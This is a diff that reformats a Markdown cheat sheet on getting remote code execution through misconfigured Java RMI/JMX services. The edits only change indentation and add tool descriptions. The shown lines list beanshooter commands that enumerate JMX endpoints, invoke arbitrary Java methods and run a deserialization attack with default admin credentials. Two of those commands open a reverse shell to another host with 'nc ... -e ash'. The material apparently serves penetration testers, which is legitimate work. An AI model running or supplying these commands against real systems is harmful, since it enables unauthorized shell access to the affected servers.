@@ -8,17 +8,17 @@
 * [Tools](#tools)
 * [Detection](#detection)
 * [Methodology](#methodology)
-  * [RCE using beanshooter](#rce-using-beanshooter)
-  * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
-  * [RCE using Metasploit](#rce-using-metasploit)
+    * [RCE using beanshooter](#rce-using-beanshooter)
+    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
+    * [RCE using Metasploit](#rce-using-metasploit)
 * [References](#references)
 
 
 ## Tools
 
-- [siberas/sjet](https://github.com/siberas/sjet)
-- [mogwailabs/mjet](https://github.com/mogwailabs/mjet)
-- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
+- [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX exploitation toolkit
+- [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation toolkit
+- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner
 - [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.
 
 
@@ -87,10 +87,12 @@ If a Java Remote Method Invocation (RMI) service is poorly configured, it become
 * Enumerate JMX endpoint: `beanshooter enum 172.17.0.2 1090`
 * Invoke method on a JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
 * Invoke arbitrary public and static Java methods: 
-  ```ps1
-  beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
-  beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
-  ```
+
+    ```ps1
+    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
+    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+    ```
+    
 * Standard MBean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
 * Deserialization attacks on a JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`
 
